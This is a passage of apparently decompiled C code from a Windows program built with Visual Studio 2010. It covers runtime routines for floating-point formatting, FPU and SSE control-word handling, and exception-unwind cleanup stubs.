            iVar3 = CONCAT22(uStack18,CONCAT11(uStack19,local_14)) << 1;
            local_14 = (byte)iVar3;
            uStack19 = (undefined)((uint)iVar3 >> 8);
            uStack18 = (ushort)((uint)iVar3 >> 0x10);
            iVar3 = CONCAT22(local_10[1],local_10[0]) * 2;
            local_10[0] = (ushort)iVar3 | uVar19 >> 0xf;
            local_10[1] = (ushort)((uint)iVar3 >> 0x10);
            iVar3 = CONCAT22(local_10[3],local_10[2]) * 2;
            local_10[2] = (ushort)iVar3 | uVar8 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            local_10[3] = (ushort)((uint)iVar3 >> 0x10);
          } while (0 < (short)iVar21);
          uVar19 = (ushort)iVar21;
          if ((short)uVar19 < 1) goto LAB_003c212b;
        }
        if ((0x8000 < CONCAT11(uStack19,local_14)) ||
           ((CONCAT22(uStack18,CONCAT11(uStack19,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22(local_10[0],uStack18) == -1) {
            uStack18 = 0;
            local_10[0] = 0;
            if (CONCAT22(local_10[2],local_10[1]) == -1) {
              local_10[1] = 0;
              local_10[2] = 0;
              if (local_10[3] == 0xffff) {
                local_10[3] = 0x8000;
                uVar19 = uVar19 + 1;
              }
              else {
                local_10[3] = local_10[3] + 1;
              }
            }
            else {
              iVar21 = CONCAT22(local_10[2],local_10[1]) + 1;
              local_10[1] = (ushort)iVar21;
              local_10[2] = (ushort)((uint)iVar21 >> 0x10);
            }
          }
          else {
            iVar21 = CONCAT22(local_10[0],uStack18) + 1;
            uStack18 = (ushort)iVar21;
            local_10[0] = (ushort)((uint)iVar21 >> 0x10);
          }
        }
        if (uVar19 < 0x7fff) {
          bStack25 = (byte)(uVar19 >> 8) | bStack25 & 0x80;
          local_24 = uStack18;
          param_1 = CONCAT22(local_10[1],local_10[0]);
          param_2 = CONCAT22(local_10[3],local_10[2]);
          local_1a = (undefined)uVar19;
        }
        else {
          local_24 = 0;
          param_1 = 0;
          iVar21 = (((bStack25 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          param_2 = 0x80000000;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack25 = (byte)((uint)iVar21 >> 0x18);
        }
        goto LAB_003c2230;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack25 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    param_1 = 0;
    local_24 = 0;
    param_2 = iVar21 << 0x10;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack25 = (byte)((uint)iVar21 >> 0x18);
  }
LAB_003c2230:
  *param_6 = local_50;
  psVar13 = param_6;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = CONCAT11(bStack25,local_1a) - 0x3ffe;
    local_1a = 0;
    bStack25 = 0;
    local_48 = 8;
    do {
      uStack30._2_2_ = (ushort)(param_2 >> 0x10);
      uStack30._0_2_ = (ushort)param_2;
      uStack34._2_2_ = (ushort)((uint)param_1 >> 0x10);
      uStack34._0_2_ = (ushort)param_1;
      uVar19 = (ushort)uStack34;
      iVar3 = CONCAT22((ushort)uStack34,local_24) << 1;
      local_24 = (ushort)iVar3;
      uStack34._0_2_ = (ushort)((uint)iVar3 >> 0x10);
      iVar3 = CONCAT22((ushort)uStack30,uStack34._2_2_) * 2;
      uStack34._2_2_ = (ushort)iVar3 | uVar19 >> 0xf;
      param_1 = CONCAT22(uStack34._2_2_,(ushort)uStack34);
      iVar4 = CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_)) * 2;
      uStack30._2_2_ = (ushort)iVar4 | (ushort)uStack30 >> 0xf;
      local_48 = local_48 + -1;
      uStack30._0_2_ = (ushort)((uint)iVar3 >> 0x10);
      param_2 = CONCAT22(uStack30._2_2_,(ushort)uStack30);
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      bStack25 = (byte)((uint)iVar4 >> 0x18);
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar15 = -iVar21 & 0xff, uVar15 != 0)) {
      do {
        iVar3 = CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_));
        uVar16 = CONCAT22((ushort)uStack30,uStack34._2_2_);
        iVar21 = CONCAT22((ushort)uStack30,uStack34._2_2_);
        uVar23 = CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_)) >> 1;
        uStack30._2_2_ = (ushort)uVar23;
        local_1a = (undefined)(uVar23 >> 0x10);
        bStack25 = bStack25 >> 1;
        uStack30._0_2_ = (ushort)uStack30 >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
        uVar23 = CONCAT22((ushort)uStack34,local_24);
        uStack34._0_2_ = (ushort)uStack34 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
        uVar15 = uVar15 - 1;
        uStack34._2_2_ = (ushort)(uVar16 >> 1);
        local_24 = (ushort)(uVar23 >> 1);
      } while (0 < (int)uVar15);
    }
    iVar21 = param_4 + 1;
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar19 = local_24;
    uVar8 = (ushort)uStack34;
    uVar11 = uStack34._2_2_;
    uVar12 = (ushort)uStack30;
    while( true ) {
      param_2 = CONCAT22(uStack30._2_2_,uVar12);
      param_1 = CONCAT22(uVar11,uVar8);
      if (iVar21 < 1) break;
      local_38 = CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_));
      uVar23 = CONCAT22(uVar8,uVar19) * 4;
      uVar15 = CONCAT22(uVar12,uVar11) * 2;
      uVar16 = (CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_)) * 2 | (uint)(uVar12 >> 0xf)) *
               2 | uVar15 >> 0x1f;
      uVar22 = (uVar15 | uVar8 >> 0xf) * 2 | (uint)(CONCAT22(uVar8,uVar19) << 1) >> 0x1f;
      uVar15 = CONCAT22(uVar8,uVar19) + uVar23;
      if ((uVar15 < uVar23) || (uVar23 = uVar22, uVar15 < CONCAT22(uVar8,uVar19))) {
        uVar23 = uVar22 + 1;
        bVar5 = false;
        if ((uVar23 < uVar22) || (uVar23 == 0)) {
          bVar5 = true;
        }
        if (bVar5) {
          uVar16 = uVar16 + 1;
        }
      }
      uVar22 = CONCAT22(uVar12,uVar11) + uVar23;
      if ((uVar22 < uVar23) || (uVar22 < CONCAT22(uVar12,uVar11))) {
        uVar16 = uVar16 + 1;
      }
      psVar13 = (short *)(uVar22 >> 0x1f);
      iVar3 = (uVar16 + local_38) * 2;
      uStack30._2_2_ = (ushort)iVar3 | (ushort)(uVar22 >> 0x1f);
      local_24 = (ushort)(uVar15 * 2);
      uStack34._0_2_ = (ushort)(uVar15 * 2 >> 0x10);
      local_1a = (undefined)((uint)iVar3 >> 0x10);
      uStack34._2_2_ = (ushort)(uVar22 * 2) | (ushort)(uVar15 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar3 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      iVar21 = iVar21 + -1;
      uStack30._0_2_ = (ushort)(uVar22 * 2 >> 0x10);
      bStack25 = 0;
      local_40 = uVar19;
      uStack62 = uVar8;
      uStack60 = uVar11;
      uStack58 = uVar12;
      uVar19 = local_24;
      uVar8 = (ushort)uStack34;
      uVar11 = uStack34._2_2_;
      uVar12 = (ushort)uStack30;
    }
    psVar18 = psVar17 + -1;
    local_24 = uVar19;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        bVar10 = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
        psVar13 = (short *)(bVar10 | 0x8000);
        *(byte *)(param_6 + 1) = bVar10;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_003c23f8;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar14 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar14;
    *(undefined *)(cVar14 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined2 *)((int)param_6 + 3) = 0x3001;
    *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_003c23f8:
  uStack34 = param_1;
  uStack30 = param_2;
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,psVar13,uVar25);
  return;
LAB_003c1c6b:
  pcVar24 = "1#QNAN";
  goto LAB_003c1c70;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2010 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else {
      if (uVar2 == 0x200) {
        uVar1 = uVar1 | 0x800;
      }
      else {
        if (uVar2 == 0x300) {
          uVar1 = uVar1 | 0xc00;
        }
      }
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else {
    if ((unaff_EBX & 0x30000) == 0x10000) {
      uVar1 = uVar1 | 0x200;
    }
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2010 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else {
      if (uVar2 == 0x200) {
        uVar1 = uVar1 | 0x4000;
      }
      else {
        if (uVar2 == 0x300) {
          uVar1 = uVar1 | 0x6000;
        }
      }
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2010 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint in_MXCSR;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else {
      if (uVar1 == 0x800) {
        uVar5 = uVar5 | 0x200;
      }
      else {
        if (uVar1 == 0xc00) {
          uVar5 = uVar5 | 0x300;
        }
      }
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else {
    if ((in_FPUControlWord & 0x300) == 0x200) {
      uVar5 = uVar5 | 0x10000;
    }
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else {
        if (uVar3 == 0x800) {
          uVar2 = uVar2 | 0x200;
        }
        else {
          if (uVar3 == 0xc00) {
            uVar2 = uVar2 | 0x300;
          }
        }
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else {
      if ((uVar5 & 0x300) == 0x200) {
        uVar2 = uVar2 | 0x10000;
      }
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (_DAT_003ea174 != 0) {
    if ((char)in_MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((in_MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((in_MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((in_MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((in_MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((in_MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = in_MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else {
        if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else {
          if (uVar3 == 0x6000) {
            uVar5 = uVar5 | 0x300;
          }
        }
      }
    }
    uVar4 = in_MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else {
      if (uVar4 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else {
        if (uVar4 == 0x8040) {
          uVar5 = uVar5 | 0x1000000;
        }
      }
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)in_MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((in_MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((in_MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((in_MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((in_MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((in_MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = in_MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else {
          if (uVar3 == 0x4000) {
            uVar5 = uVar5 | 0x200;
          }
          else {
            if (uVar3 == 0x6000) {
              uVar5 = uVar5 | 0x300;
            }
          }
        }
      }
      uVar3 = in_MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else {
        if (uVar3 == 0x8000) {
          uVar5 = uVar5 | 0x3000000;
        }
        else {
          if (uVar3 == 0x8040) {
            uVar5 = uVar5 | 0x1000000;
          }
        }
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2010 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  bool bVar3;
  uint *puVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  short local_8;
  
  puVar4 = param_3;
  uVar7 = 0;
  local_8 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    param_3 = (uint *)0x0;
    do {
      uVar2 = *puVar4;
      uVar9 = *puVar4;
      uVar8 = puVar4[1];
      uVar1 = puVar4[2];
      bVar3 = false;
      uVar5 = (uVar7 * 2 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar2 * 4;
      uVar7 = ((int)param_3 * 2 | uVar7 >> 0x1f) * 2 | uVar7 * 2 >> 0x1f;
      uVar6 = uVar9 + uVar2;
      *puVar4 = uVar2;
      puVar4[1] = uVar5;
      puVar4[2] = uVar7;
      if ((uVar6 < uVar2) || (uVar6 < uVar9)) {
        bVar3 = true;
      }
      *puVar4 = uVar6;
      uVar9 = uVar5;
      if (bVar3) {
        bVar3 = false;
        uVar9 = uVar5 + 1;
        if ((uVar9 < uVar5) || (uVar9 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar9;
        if (bVar3) {
          uVar7 = uVar7 + 1;
          puVar4[2] = uVar7;
        }
      }
      bVar3 = false;
      uVar2 = uVar9 + uVar8;
      if ((uVar2 < uVar9) || (uVar2 < uVar8)) {
        bVar3 = true;
      }
      puVar4[1] = uVar2;
      if (bVar3) {
        uVar7 = uVar7 + 1;
        puVar4[2] = uVar7;
      }
      bVar3 = false;
      param_3 = (uint *)((uVar7 + uVar1) * 2 | uVar2 >> 0x1f);
      uVar9 = uVar6 * 2;
      uVar8 = uVar2 * 2 | uVar6 >> 0x1f;
      puVar4[2] = (uint)param_3;
      *puVar4 = uVar9;
      puVar4[1] = uVar8;
      uVar7 = uVar9 + (int)*param_1;
      if ((uVar7 < uVar9) || (uVar7 < (uint)(int)*param_1)) {
        bVar3 = true;
      }
      *puVar4 = uVar7;
      uVar7 = uVar8;
      if (bVar3) {
        uVar7 = uVar8 + 1;
        bVar3 = false;
        if ((uVar7 < uVar8) || (uVar7 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar7;
        if (bVar3) {
          param_3 = (uint *)((int)param_3 + 1);
          puVar4[2] = (uint)param_3;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
      puVar4[1] = uVar7;
      puVar4[2] = (uint)param_3;
    } while (param_2 != 0);
  }
  if (puVar4[2] == 0) {
    uVar7 = puVar4[1];
    do {
      local_8 = local_8 + -0x10;
      uVar9 = uVar7 >> 0x10;
      uVar7 = uVar7 << 0x10 | *puVar4 >> 0x10;
      puVar4[1] = uVar7;
      *puVar4 = *puVar4 << 0x10;
    } while (uVar9 == 0);
    puVar4[2] = uVar9;
  }
  uVar7 = puVar4[2];
  if ((uVar7 & 0x8000) == 0) {
    uVar9 = puVar4[1];
    do {
      local_8 = local_8 + -1;
      uVar8 = uVar7 * 2;
      uVar7 = uVar8 | uVar9 >> 0x1f;
      uVar9 = uVar9 * 2 | *puVar4 >> 0x1f;
      *puVar4 = *puVar4 * 2;
      puVar4[1] = uVar9;
      puVar4[2] = uVar7;
    } while ((uVar8 & 0x8000) == 0);
  }
  *(short *)((int)puVar4 + 10) = local_8;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2010 Release

void ___set_fpsr_sse2(uint param_1)

{
  return;
}



void Unwind_003c2ae0(void)

{
  int unaff_EBP;
  
  FUN_003ae995((int *)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c2b03(void)

{
  int unaff_EBP;
  
  **(undefined ***)(unaff_EBP + -0x10) = (undefined *)std::locale::facet::vftable;
  return;
}



void Unwind_003c2b0b(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + -0x10) + 0x18);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2b50(void)

{
  int unaff_EBP;
  
  FUN_003ae995(*(int **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2b58(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 4);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2b63(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0xc);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2b6e(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0x14);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2b79(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0x1c);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2ba0(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c2bf0(void)

{
  int unaff_EBP;
  
  FUN_003ae995(*(int **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2bf8(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 4);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2c03(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0xc);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2c0e(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0x14);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2c19(void)

{
  void *_Memory;
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = (void **)(*(int *)(unaff_EBP + 8) + 0x1c);
  _Memory = *ppvVar1;
  if (_Memory != (void *)0x0) {
    _free(_Memory);
  }
  *ppvVar1 = (void *)0x0;
  return;
}



void Unwind_003c2c40(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x14));
  return;
}



void Unwind_003c2c4b(void)

{
  int unaff_EBP;
  
  if ((*(uint *)(unaff_EBP + -0x10) & 1) != 0) {
    *(uint *)(unaff_EBP + -0x10) = *(uint *)(unaff_EBP + -0x10) & 0xfffffffe;
    FUN_00399330((int *)(unaff_EBP + -0x38));
  }
  return;
}



void Unwind_003c2c65(void)

{
  int unaff_EBP;
  
  **(undefined ***)(unaff_EBP + -0x14) = (undefined *)std::locale::facet::vftable;
  return;
}



void Unwind_003c2c90(void)

{
  int unaff_EBP;
  
  FUN_003ae995((int *)(unaff_EBP + -0x18));
  return;
}



void Unwind_003c2cc0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x40));
  return;
}



void Unwind_003c2cc8(void)

{
  int unaff_EBP;
  
  Ordinal_9(unaff_EBP + -0x68);
  return;
}



void Unwind_003c2d00(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c2d30(void)

{
  int unaff_EBP;
  
  FUN_003ae9c6((LPCRITICAL_SECTION *)(*(int *)(unaff_EBP + 8) + 4));
  return;
}



void Unwind_003c2d60(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + 8));
  return;
}



void Unwind_003c2d90(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2dc0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2e10(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -0x54));
  return;
}



void Unwind_003c2e18(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c2e50(void)

{
  int unaff_EBP;
  
  FUN_00399480((uint *)(unaff_EBP + -100));
  return;
}



void Unwind_003c2e58(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x4c));
  return;
}



void Unwind_003c2e60(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c2e68(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c2ea0(void)

{
  int iVar1;
  int iVar2;
  int unaff_EBP;
  
  iVar1 = *(int *)(unaff_EBP + -0x10);
  iVar2 = iVar1 + -0x48;
  *(undefined ***)(*(int *)(*(int *)(iVar1 + -0x60) + 4) + -0x18 + iVar2) =
       std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)(iVar1 + -0x50) + 4) + -8 + iVar2) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*(int *)(iVar1 + -0x60) + 4) + -0x18 + iVar2) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c2ed0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2f00(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c2f30(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c2f60(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_003c2fb0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + 8));
  return;
}



void Unwind_003c2fe0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c2fe8(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x2c));
  return;
}



void Unwind_003c2ff0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x48));
  return;
}



void Unwind_003c3020(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x130));
  return;
}



void Unwind_003c3060(void)

{
  int unaff_EBP;
  
  *(undefined ***)
   (*(int *)(*(int *)(*(int *)(unaff_EBP + -0x10) + -0x50) + 4) +
   *(int *)(unaff_EBP + -0x10) + -0x50) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  return;
}



void Unwind_003c3090(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x30));
  return;
}



void Unwind_003c3098(void)

{
  int unaff_EBP;
  
  Ordinal_9(unaff_EBP + -0x90);
  return;
}



void Unwind_003c30a3(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c30e0(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0xd8));
  return;
}



void Unwind_003c30eb(void)

{
  FUN_003959c0();
  return;
}



void Unwind_003c30f6(void)

{
  int unaff_EBP;
  
  FUN_00389360((void **)(unaff_EBP + -0x110));
  return;
